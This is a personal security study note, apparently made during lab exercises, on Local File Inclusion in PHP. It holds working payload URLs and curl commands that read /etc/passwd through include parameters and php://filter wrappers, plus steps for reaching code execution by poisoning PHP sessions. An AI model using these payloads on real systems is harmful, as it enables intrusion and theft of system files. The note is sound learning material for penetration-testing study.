---
creation date: November 15th 2022
last modified date: November 15th 2022
aliases: [Local File Inclusion]
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: [[PHP]] - [[Websites]]
Search Tag: #📕  

# [[LFI]]  
___

## Description:  
This stands for **Local File Inclusion** and is a vulnerability found in various web applications.


## Tips
- Reading these from a browser can be annoying as it fails to format so we can use `curl` in order to make the call. This will stylize with the terminal how they should be.
	- Note if there is a login page in the way it does take a bit more work to do it this way
```bash
# First we save the cookie
curl -s http://example.com/login.php -c cookiefile -d "user=admin&pass=admin"
curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile
```


## Functions that cause vulnerabilities 
### PHP
- `include`
- `require`
- `include_once`
- `require_once`

#### [PHP-Supported Wrapper](https://www.php.net/manual/en/wrappers.php.php)
These provide a number of miscellaneous I/O streams.
- `php://filter/resources`
```scheme
http://example.thm.labs/page.php?file=php://filter/resource=/etc/passwd
```
- `php://filter/read=string.rot13/resource`
	- This will encrypt the output to in this example "rot13". Useful if we are trying to display a .php file and the server is trying to execute it instead.
```scheme
http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
```


## Getting RCE
### Option 1
1. We need to locate where the site stores PHP sessions:
```
c:\Windows\Temp
/tmp/
/var/lib/php5
/var/lib/php/session
```
2. We can inject PHP test code into a sign in page as the username: `<?php phpinfo(); ?>`
![[Pasted image 20221115173620.png]]
3. We get the **PHPESSID** from our cookies on the site this value: `vc4567al6pq7usm2cufmilkm45` will contain our injected php code.
4. Now we test against the possible PHP session storage locations:
	1. PHP by default uses the following naming scheme `sess_%3CSESSION ID%3E`
```scheme
http://example.thm.labs/page.php?file=/tmp/sess_vc4567al6pq7usm2cufmilkm45
```
5 If we are successful the page should display our test injected PHP code:
![[Pasted image 20221115174032.png]]

##ADD INFO ABOUT FINALLY CONNECTING WITH RCE TO ABOVE SECTION## [PHP Session Hijacking](https://alamot.github.io/unattended_writeup/#lfi-to-rce-via-php-session-poisoning)

### Apache log poisoning
```bash
/var/log/apache2/access.log
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: November 15th 2022 (04:43 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>